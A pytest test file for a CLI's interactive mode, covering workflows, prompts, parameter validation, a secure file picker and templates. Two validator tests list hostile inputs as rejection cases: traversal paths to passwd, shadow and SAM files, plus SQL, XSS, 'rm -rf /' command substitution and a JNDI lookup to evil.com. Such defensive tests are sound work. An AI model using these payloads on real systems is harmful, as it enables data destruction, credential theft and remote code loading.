"""
Tests for Interactive mode with security and validation (Task 6).

This module tests the interactive mode functionality including guided workflow
prompts, parameter validation, secure file picker, configuration templates,
and interactive parameter review.
"""

import pytest
import tempfile
import os
from unittest.mock import Mock, patch, MagicMock
from pathlib import Path
import typer
from typer.testing import CliRunner

from emuses.cli.interactive_mode import (
    InteractiveWorkflowManager,
    WorkflowPrompt,
    ParameterValidator,
    SecureFilePicker,
    ConfigurationTemplateManager,
    InteractiveParameterReview
)


class TestInteractiveWorkflowManager:
    """Test the interactive workflow manager."""
    
    @pytest.fixture
    def workflow_manager(self):
        """Create a workflow manager instance."""
        return InteractiveWorkflowManager()
    
    def test_workflow_manager_creation(self, workflow_manager):
        """Test that workflow manager initializes correctly."""
        assert workflow_manager is not None
        assert hasattr(workflow_manager, 'available_workflows')
        assert hasattr(workflow_manager, 'current_workflow')
        assert hasattr(workflow_manager, 'workflow_history')
    
    def test_list_available_workflows(self, workflow_manager):
        """Test listing available workflows."""
        workflows = workflow_manager.list_available_workflows()
        assert isinstance(workflows, list)
        assert len(workflows) > 0
        
        # Check for common workflow scenarios
        workflow_names = [w['name'] for w in workflows]
        assert 'data_processing' in workflow_names
        assert 'model_training' in workflow_names
        assert 'visualization' in workflow_names
    
    def test_start_workflow(self, workflow_manager):
        """Test starting a workflow."""
        workflow_id = workflow_manager.start_workflow('data_processing')
        assert workflow_id is not None
        assert workflow_manager.current_workflow is not None
        assert workflow_manager.current_workflow['id'] == workflow_id
    
    def test_workflow_step_navigation(self, workflow_manager):
        """Test navigating through workflow steps."""
        workflow_id = workflow_manager.start_workflow('data_processing')
        
        # Get current step
        current_step = workflow_manager.get_current_step()
        assert current_step is not None
        assert 'name' in current_step
        assert 'description' in current_step
        
        # Navigate to next step
        next_step = workflow_manager.next_step()
        assert next_step is not None
        assert next_step != current_step
    
    def test_workflow_completion(self, workflow_manager):
        """Test completing a workflow."""
        workflow_id = workflow_manager.start_workflow('data_processing')
        
        # Complete all steps
        while not workflow_manager.is_workflow_complete():
            workflow_manager.next_step()
        
        # Verify completion
        assert workflow_manager.is_workflow_complete()
        completed_workflow = workflow_manager.complete_workflow()
        assert completed_workflow is not None
        assert completed_workflow['status'] == 'completed'


class TestWorkflowPrompt:
    """Test workflow prompt functionality."""
    
    @pytest.fixture
    def workflow_prompt(self):
        """Create a workflow prompt instance."""
        return WorkflowPrompt()
    
    def test_prompt_creation(self, workflow_prompt):
        """Test that workflow prompt initializes correctly."""
        assert workflow_prompt is not None
        assert hasattr(workflow_prompt, 'prompt_history')
        assert hasattr(workflow_prompt, 'current_context')
    
    def test_text_input_prompt(self, workflow_prompt):
        """Test text input prompts."""
        with patch('typer.prompt') as mock_prompt:
            mock_prompt.return_value = "test_input"
            
            result = workflow_prompt.prompt_text(
                "Enter your name:",
                default="default_name"
            )
            
            assert result == "test_input"
            mock_prompt.assert_called_once()
    
    def test_choice_prompt(self, workflow_prompt):
        """Test choice prompts."""
        with patch('typer.prompt') as mock_prompt:
            mock_prompt.return_value = "option1"
            
            result = workflow_prompt.prompt_choice(
                "Choose an option:",
                choices=['option1', 'option2', 'option3']
            )
            
            assert result == "option1"
            mock_prompt.assert_called_once()
    
    def test_confirm_prompt(self, workflow_prompt):
        """Test confirmation prompts."""
        with patch('typer.confirm') as mock_confirm:
            mock_confirm.return_value = True
            
            result = workflow_prompt.prompt_confirm(
                "Are you sure?",
                default=False
            )
            
            assert result is True
            mock_confirm.assert_called_once()
    
    def test_path_prompt(self, workflow_prompt):
        """Test path input prompts."""
        with tempfile.TemporaryDirectory() as temp_dir:
            test_path = Path(temp_dir) / "test_file.txt"
            test_path.write_text("test content")
            
            with patch('typer.prompt') as mock_prompt:
                mock_prompt.return_value = str(test_path)
                
                result = workflow_prompt.prompt_path(
                    "Enter file path:",
                    must_exist=True
                )
                
                assert result == str(test_path)
                mock_prompt.assert_called_once()


class TestParameterValidator:
    """Test parameter validation functionality."""
    
    @pytest.fixture
    def validator(self):
        """Create a parameter validator instance."""
        return ParameterValidator()
    
    def test_validator_creation(self, validator):
        """Test that parameter validator initializes correctly."""
        assert validator is not None
        assert hasattr(validator, 'validation_rules')
        assert hasattr(validator, 'security_checks')
    
    def test_file_path_validation(self, validator):
        """Test file path validation."""
        with tempfile.TemporaryDirectory() as temp_dir:
            # Valid file path
            valid_path = Path(temp_dir) / "valid_file.txt"
            valid_path.write_text("test content")
            
            result = validator.validate_file_path(str(valid_path))
            assert result.is_valid
            assert result.value == str(valid_path)
            
            # Invalid file path
            invalid_path = Path(temp_dir) / "nonexistent_file.txt"
            result = validator.validate_file_path(str(invalid_path))
            assert not result.is_valid
            assert "does not exist" in result.error_message
    
    def test_security_path_validation(self, validator):
        """Test security validation for file paths."""
        # Test path traversal attempts
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM"
        ]
        
        for path in malicious_paths:
            result = validator.validate_file_path(path)
            assert not result.is_valid
            assert "security" in result.error_message.lower()
    
    def test_numeric_validation(self, validator):
        """Test numeric parameter validation."""
        # Valid numeric values
        valid_numbers = [42, 3.14, "123", "45.67"]
        
        for value in valid_numbers:
            result = validator.validate_numeric(value, min_value=0, max_value=100)
            assert result.is_valid
        
        # Invalid numeric values
        invalid_numbers = ["abc", "12.34.56", None, [], {}]
        
        for value in invalid_numbers:
            result = validator.validate_numeric(value)
            assert not result.is_valid
    
    def test_string_validation(self, validator):
        """Test string parameter validation."""
        # Valid strings
        result = validator.validate_string("valid_string", min_length=5, max_length=20)
        assert result.is_valid
        
        # Too short
        result = validator.validate_string("hi", min_length=5)
        assert not result.is_valid
        
        # Too long
        result = validator.validate_string("very_long_string_that_exceeds_limit", max_length=10)
        assert not result.is_valid
    
    def test_injection_attack_prevention(self, validator):
        """Test prevention of injection attacks."""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "$(rm -rf /)",
            "`rm -rf /`",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for input_value in malicious_inputs:
            result = validator.validate_string(input_value)
            assert not result.is_valid
            assert "potentially malicious" in result.error_message.lower()


class TestSecureFilePicker:
    """Test secure file picker functionality."""
    
    @pytest.fixture
    def file_picker(self):
        """Create a secure file picker instance."""
        return SecureFilePicker()
    
    def test_file_picker_creation(self, file_picker):
        """Test that file picker initializes correctly."""
        assert file_picker is not None
        assert hasattr(file_picker, 'allowed_extensions')
        assert hasattr(file_picker, 'max_file_size')
        assert hasattr(file_picker, 'base_directory')
    
    def test_file_selection(self, file_picker):
        """Test file selection functionality."""
        with tempfile.TemporaryDirectory() as temp_dir:
            # Create test files
            test_file = Path(temp_dir) / "test.txt"
            test_file.write_text("test content")
            
            with patch('typer.prompt') as mock_prompt:
                mock_prompt.return_value = str(test_file)
                
                result = file_picker.select_file(
                    prompt="Select a file:",
                    allowed_extensions=['.txt', '.csv']
                )
                
                assert result == str(test_file)
    
    def test_file_permission_check(self, file_picker):
        """Test file permission checking."""
        with tempfile.TemporaryDirectory() as temp_dir:
            # Create test file
            test_file = Path(temp_dir) / "test.txt"
            test_file.write_text("test content")
            
            # Test readable file
            assert file_picker.check_file_permissions(str(test_file), 'read')
            
            # Test directory permissions
            assert file_picker.check_file_permissions(temp_dir, 'read')
    
    def test_file_extension_validation(self, file_picker):
        """Test file extension validation."""
        # Valid extensions
        valid_files = [
            "data.csv",
            "image.png",
            "document.pdf"
        ]
        
        for filename in valid_files:
            assert file_picker.is_extension_allowed(filename, ['.csv', '.png', '.pdf'])
        
        # Invalid extensions
        invalid_files = [
            "script.exe",
            "malware.bat",
            "config.sys"
        ]
        
        for filename in invalid_files:
            assert not file_picker.is_extension_allowed(filename, ['.csv', '.png', '.pdf'])
    
    def test_file_size_validation(self, file_picker):
        """Test file size validation."""
        with tempfile.TemporaryDirectory() as temp_dir:
            # Create small test file
            small_file = Path(temp_dir) / "small.txt"
            small_file.write_text("small content")
            
            assert file_picker.is_file_size_valid(str(small_file), max_size_mb=1)
            
            # Test size limit
            assert not file_picker.is_file_size_valid(str(small_file), max_size_mb=0.000001)


class TestConfigurationTemplateManager:
    """Test configuration template management."""
    
    @pytest.fixture
    def template_manager(self):
        """Create a configuration template manager instance."""
        return ConfigurationTemplateManager()
    
    def test_template_manager_creation(self, template_manager):
        """Test that template manager initializes correctly."""
        assert template_manager is not None
        assert hasattr(template_manager, 'templates')
        assert hasattr(template_manager, 'template_directory')
    
    def test_list_templates(self, template_manager):
        """Test listing available templates."""
        templates = template_manager.list_templates()
        assert isinstance(templates, list)
        assert len(templates) > 0
        
        # Check template structure
        for template in templates:
            assert 'name' in template
            assert 'description' in template
            assert 'parameters' in template
    
    def test_load_template(self, template_manager):
        """Test loading a template."""
        templates = template_manager.list_templates()
        template_name = templates[0]['name']
        
        loaded_template = template_manager.load_template(template_name)
        assert loaded_template is not None
        assert loaded_template['name'] == template_name
    
    def test_apply_template(self, template_manager):
        """Test applying a template with parameters."""
        template_name = 'data_processing'
        parameters = {
            'input_file': 'test_input.csv',
            'output_file': 'test_output.csv',
            'processing_method': 'standard'
        }
        
        config = template_manager.apply_template(template_name, parameters)
        assert config is not None
        assert isinstance(config, dict)
        assert 'input_file' in config
        assert config['input_file'] == 'test_input.csv'
    
    def test_save_custom_template(self, template_manager):
        """Test saving a custom template."""
        custom_template = {
            'name': 'custom_workflow',
            'description': 'Custom workflow template',
            'parameters': {
                'param1': {'type': 'string', 'default': 'value1'},
                'param2': {'type': 'int', 'default': 42}
            }
        }
        
        result = template_manager.save_template(custom_template)
        assert result is True
        
        # Verify template was saved
        templates = template_manager.list_templates()
        template_names = [t['name'] for t in templates]
        assert 'custom_workflow' in template_names


class TestInteractiveParameterReview:
    """Test interactive parameter review functionality."""
    
    @pytest.fixture
    def parameter_review(self):
        """Create a parameter review instance."""
        return InteractiveParameterReview()
    
    def test_parameter_review_creation(self, parameter_review):
        """Test that parameter review initializes correctly."""
        assert parameter_review is not None
        assert hasattr(parameter_review, 'parameters')
        assert hasattr(parameter_review, 'review_history')
    
    def test_add_parameter(self, parameter_review):
        """Test adding parameters for review."""
        parameter_review.add_parameter('input_file', '/path/to/file.csv', 'Input data file')
        parameter_review.add_parameter('output_dir', '/path/to/output', 'Output directory')
        
        parameters = parameter_review.get_parameters()
        assert len(parameters) == 2
        assert 'input_file' in parameters
        assert parameters['input_file']['value'] == '/path/to/file.csv'
    
    def test_review_session(self, parameter_review):
        """Test conducting a parameter review session."""
        # Add parameters
        parameter_review.add_parameter('param1', 'value1', 'First parameter')
        parameter_review.add_parameter('param2', 'value2', 'Second parameter')
        
        with patch('typer.confirm') as mock_confirm:
            mock_confirm.return_value = True
            
            result = parameter_review.conduct_review()
            assert result is True
            assert parameter_review.is_review_complete()
    
    def test_parameter_modification(self, parameter_review):
        """Test modifying parameters during review."""
        parameter_review.add_parameter('param1', 'original_value', 'Test parameter')
        
        # Modify parameter
        parameter_review.modify_parameter('param1', 'modified_value')
        
        parameters = parameter_review.get_parameters()
        assert parameters['param1']['value'] == 'modified_value'
    
    def test_parameter_validation_during_review(self, parameter_review):
        """Test parameter validation during review."""
        parameter_review.add_parameter('file_path', '/valid/path.txt', 'File path')
        
        # Test validation
        with patch.object(parameter_review, 'validate_parameter') as mock_validate:
            mock_validate.return_value = True
            
            result = parameter_review.validate_all_parameters()
            assert result is True
            mock_validate.assert_called()
    
    def test_review_summary(self, parameter_review):
        """Test generating review summary."""
        parameter_review.add_parameter('param1', 'value1', 'First parameter')
        parameter_review.add_parameter('param2', 'value2', 'Second parameter')
        
        summary = parameter_review.generate_summary()
        assert summary is not None
        assert isinstance(summary, dict)
        assert 'parameters' in summary
        assert 'total_count' in summary
        assert summary['total_count'] == 2